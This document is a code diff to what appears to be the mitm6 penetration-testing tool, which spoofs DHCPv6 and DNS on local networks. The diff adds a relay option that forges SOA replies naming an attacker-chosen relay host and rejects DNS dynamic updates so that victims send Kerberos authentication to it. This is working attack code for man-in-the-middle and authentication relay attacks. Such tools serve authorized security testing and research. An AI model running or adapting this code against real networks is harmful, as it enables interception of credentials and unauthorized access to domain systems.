@@ -72,6 +72,11 @@ class Config(object):
         self.selfptr = ipaddress.ip_address(str(self.selfaddr)).reverse_pointer + '.'
         self.ipv6noaddr = random.randint(1,9999)
         self.ipv6noaddrc = 1
+        # Relay target
+        if args.relay:
+            self.relay = args.relay.lower()
+        else:
+            self.relay = None
         # DNS allowlist / blocklist options
         self.dns_allowlist = [d.lower() for d in args.domain]
         self.dns_blocklist = [d.lower() for d in args.blocklist]
@@ -175,18 +180,18 @@ def send_dns_reply(p):
         ip = p[IP]
         resp = Ether(dst=p.src, src=p.dst)/IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
     dns = p[DNS]
-    #only reply to IN, and to messages that dont contain answers
+    # only reply to IN, and to messages that dont contain answers
     if dns.qd.qclass != 1 or dns.qr != 0:
         return
-    #Make sure the requested name is in unicode here
+    # Make sure the requested name is in unicode here
     reqname = dns.qd.qname.decode()
-    #A request
+    # A query
     if dns.qd.qtype == 1:
         rdata = config.selfipv4
-    #AAAA request
+    # AAAA query
     elif dns.qd.qtype == 28:
         rdata = config.selfaddr
-    #PTR request
+    # PTR query
     elif dns.qd.qtype == 12:
         # To reply for PTR requests for our own hostname
         # comment the return statement
@@ -196,6 +201,22 @@ def send_dns_reply(p):
             rdata = 'attacker.%s' % config.localdomain
         else:
             return
+    # SOA query
+    elif dns.qd.qtype == 6 and config.relay:
+        if dns.opcode == 5:
+            if config.verbose or config.debug:
+                print('Dynamic update found, refusing it to trigger auth')
+            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, ns=dns.ns, opcode=5, rcode=5)
+            sendp(resp, verbose=False)
+        else:
+            rdata = config.selfaddr
+            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, nscount=1, arcount=1, ancount=1, an=DNSRRSOA(rrname=dns.qd.qname, ttl=100, mname="%s." % config.relay, rname="mitm6", serial=1337, type=dns.qd.qtype),
+                        ns=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=config.relay, type=2),
+                        ar=DNSRR(rrname=config.relay, type=1, rclass=1, ttl=300, rdata=config.selfipv4))
+            sendp(resp, verbose=False)
+            if config.verbose or config.debug:
+                print('Sent SOA reply')
+        return
     #Not handled
     else:
         return
@@ -332,12 +353,13 @@ def main():
     parser.add_argument("-6", "--ipv6", type=str, metavar='ADDRESS', help="IPv6 link-local address to send packets from (default: autodetect)")
     parser.add_argument("-m", "--mac", type=str, metavar='ADDRESS', help="Custom mac address - probably breaks stuff (default: mac of selected interface)")
     parser.add_argument("-a", "--no-ra", action='store_true', help="Do not advertise ourselves (useful for networks which detect rogue Router Advertisements)")
+    parser.add_argument("-r", "--relay", type=str, metavar='TARGET', help="Authentication relay target, will be used as fake DNS server hostname to trigger Kerberos auth")
     parser.add_argument("-v", "--verbose", action='store_true', help="Show verbose information")
     parser.add_argument("--debug", action='store_true', help="Show debug information")
 
     filtergroup = parser.add_argument_group("Filtering options")
     filtergroup.add_argument("-d", "--domain", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Allowlist principle, multiple can be specified.)")
-    filtergroup.add_argument("-b", "--blocklist", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Blocklist principle, multiple can be specified.)")
+    filtergroup.add_argument("-b", "--blocklist", "--blacklist", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Blocklist principle, multiple can be specified.)")
     filtergroup.add_argument("-hw", "-ha", "--host-allowlist", "--host-whitelist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Allowlist principle, multiple can be specified.)")
     filtergroup.add_argument("-hb", "--host-blocklist", "--host-blacklist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Blocklist principle, multiple can be specified.)")
     filtergroup.add_argument("--ignore-nofqdn", action='store_true', help="Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.")
@@ -358,6 +380,8 @@ def main():
             print('DNS allowlist: *')
         else:
             print('DNS allowlist: %s' % ', '.join(config.dns_allowlist))
+            if config.relay and len([matching for matching in config.dns_allowlist if matching in config.relay]) == 0:
+                print('Warning: Relay target is specified but the DNS query allowlist does not contain the target name.')
         if config.dns_blocklist:
             print('DNS blocklist: %s' % ', '.join(config.dns_blocklist))
     if config.host_allowlist:
